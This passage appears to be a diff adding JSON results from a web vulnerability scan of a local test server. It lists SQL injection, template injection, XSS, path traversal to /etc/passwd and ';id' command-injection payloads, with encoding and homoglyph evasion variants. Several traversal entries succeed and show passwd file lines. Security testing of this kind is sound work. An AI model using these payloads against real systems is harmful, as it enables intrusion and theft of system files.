+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%27%20UNION%20SELECT",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%2527%2520UNION%2520SELECT",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252527%252520UNION%252520SELECT",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%27%20union%20select",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%27%20%D5%8DNION%20SELECT",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%7B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%257B%257B7%252A7%257D%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%25257B%25257B7%25252A7%25257D%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%7B%7B%EF%BC%97%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%EF%BD%9B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%24%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%2524%257B7%252A7%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252524%25257B7%25252A7%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%24%7B%EF%BC%97%2A7%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%EF%BC%84%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%3C%D5%95cript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252522%25253E%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert%2525281%252529%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%22%3E%3CIMG%20SRC%3DX%20ONERROR%3DALERT%281%29%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%22%3E%3C%D1%96mg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=..%2F..%2F..%2Fetc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature 'root:x:' in: ...../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:da..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature 'root:x:' in: ...../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:da..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fetc%25252Fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature 'root:x:' in: ...../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:da..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=..%2F..%2F..%2FETC%2FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=..%2F..%2F..%2F%D0%B5tc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature 'root:x:' in: ...me=../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:da..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature 'root:x:' in: ...me=../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:da..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc%2525252fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252E%252E%252F%252E%252E%252FETC%252FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252%D0%B5%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: profile name=%2е./../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%3Bid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%253Bid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%25253Bid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%3BID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%3B%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%7Cid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%257Cid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%25257Cid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%7CID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%7C%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%27%20OR%201%3D1--",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; OR 1=1--' in: stored comment: &#x27; OR 1=1--\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%2527%2520OR%25201%253D1%252D%252D",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; OR 1=1--' in: stored comment: &#x27; OR 1=1--\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252527%252520OR%2525201%25253D1%25252D%25252D",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; OR 1=1--' in: stored comment: &#x27; OR 1=1--\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%27%20or%201%3D1--",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; OR 1=1--' in: stored comment: &#x27; or 1=1--\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%27%20%D0%9ER%201%3D1--",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; OR 1=1--' in: ...)&lt;/script&gt;', '&#x27; OR 1=1--', '&#x27; OR 1=1--', '&#x27; OR 1=1--',..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%27%20UNION%20SELECT",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; UNION SELECT' in: stored comment: &#x27; UNION SELECT\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%2527%2520UNION%2520SELECT",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; UNION SELECT' in: stored comment: &#x27; UNION SELECT\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252527%252520UNION%252520SELECT",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; UNION SELECT' in: stored comment: &#x27; UNION SELECT\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%27%20union%20select",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; UNION SELECT' in: stored comment: &#x27; union select\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%27%20%D5%8DNION%20SELECT",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&#x27; UNION SELECT' in: ...'&#x27; ОR 1=1--', '&#x27; UNION SELECT', '&#x27; UNION SELECT', '&#x27; UNION ..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%7B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '{{7*7}}' in: stored comment: {{7*7}}\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%257B%257B7%252A7%257D%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '{{7*7}}' in: stored comment: {{7*7}}\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%25257B%25257B7%25252A7%25257D%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '{{7*7}}' in: stored comment: {{7*7}}\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%7B%7B%EF%BC%97%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '{{7*7}}' in: ...27; ՍNION SELECT', '{{7*7}}', '{{7*7}}', '{{7*7}}', '{{７*7}}']"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%EF%BD%9B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '{{7*7}}' in: ...27; ՍNION SELECT', '{{7*7}}', '{{7*7}}', '{{7*7}}', '{{７*7}}', '｛{7..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%24%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '${7*7}' in: stored comment: ${7*7}\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%2524%257B7%252A7%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '${7*7}' in: stored comment: ${7*7}\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252524%25257B7%25252A7%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '${7*7}' in: stored comment: ${7*7}\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%24%7B%EF%BC%97%2A7%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '${7*7}' in: ...７*7}}', '｛{7*7}}', '${7*7}', '${7*7}', '${7*7}', '${７*7}']"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%EF%BC%84%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '${7*7}' in: ...７*7}}', '｛{7*7}}', '${7*7}', '${7*7}', '${7*7}', '${７*7}', '＄{7*7}..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&lt;script&gt;alert(1)&lt;/script&gt;' in: stored comment: &lt;script&gt;alert(1)&lt;/script&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&lt;script&gt;alert(1)&lt;/script&gt;' in: stored comment: &lt;script&gt;alert(1)&lt;/script&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&lt;script&gt;alert(1)&lt;/script&gt;' in: stored comment: &lt;script&gt;alert(1)&lt;/script&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&lt;script&gt;alert(1)&lt;/script&gt;' in: stored comment: &lt;SCRIPT&gt;ALERT(1)&lt;/SCRIPT&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%3C%D5%95cript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&lt;script&gt;alert(1)&lt;/script&gt;' in: ...ipt&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/script&gt;', '&#x27; OR 1=1--', '&#x27; OR 1=1--',..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;' in: stored comment: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;' in: stored comment: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252522%25253E%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert%2525281%252529%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;' in: stored comment: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%22%3E%3CIMG%20SRC%3DX%20ONERROR%3DALERT%281%29%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;' in: stored comment: &quot;&gt;&lt;IMG SRC=X ONERROR=ALERT(1)&gt;\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%22%3E%3C%D1%96mg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;' in: ...)&lt;/script&gt;', '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;', '&quot;&gt;&lt;img src=x onerror=aler..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=..%2F..%2F..%2Fetc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '../../../etc/passwd' in: stored comment: ../../../etc/passwd\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '../../../etc/passwd' in: stored comment: ../../../etc/passwd\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fetc%25252Fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '../../../etc/passwd' in: stored comment: ../../../etc/passwd\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=..%2F..%2F..%2FETC%2FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '../../../etc/passwd' in: stored comment: ../../../ETC/PASSWD\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=..%2F..%2F..%2F%D0%B5tc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '../../../etc/passwd' in: ...ror=alert(1)&gt;', '../../../etc/passwd', '../../../etc/passwd', '../../../etc/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "endpoint HTML-escapes input; response: stored comment: ../../etc/passwd\ncomments: ['&lt;script&gt;alert(1)&lt;/script&gt;', '&#x27; OR 1=1--', '&#x27; OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "endpoint HTML-escapes input; response: stored comment: ../../etc/passwd\ncomments: ['&lt;script&gt;alert(1)&lt;/script&gt;', '&#x27; OR 1=1--', '&#x27; OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc%2525252fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '%2e%2e%2f%2e%2e%2fetc%2fpasswd' in: stored comment: %2e%2e%2f%2e%2e%2fetc%2fpasswd\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252E%252E%252F%252E%252E%252FETC%252FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '%2e%2e%2f%2e%2e%2fetc%2fpasswd' in: ...../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../ETC/PASSWD']"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%252%D0%B5%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output '%2e%2e%2f%2e%2e%2fetc%2fpasswd' in: ...../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../ETC/PASSWD', '%2е./../etc/pass..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%3Bid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output ';id' in: stored comment: ;id\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%253Bid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output ';id' in: stored comment: ;id\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/comment?text=%25253Bid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "safe",
+      "evidence": "HTML-escaped output ';id' in: stored comment: ;id\ncomments: ['&lt;script&gt;alert(1)&lt;/..."
+    },
+    {
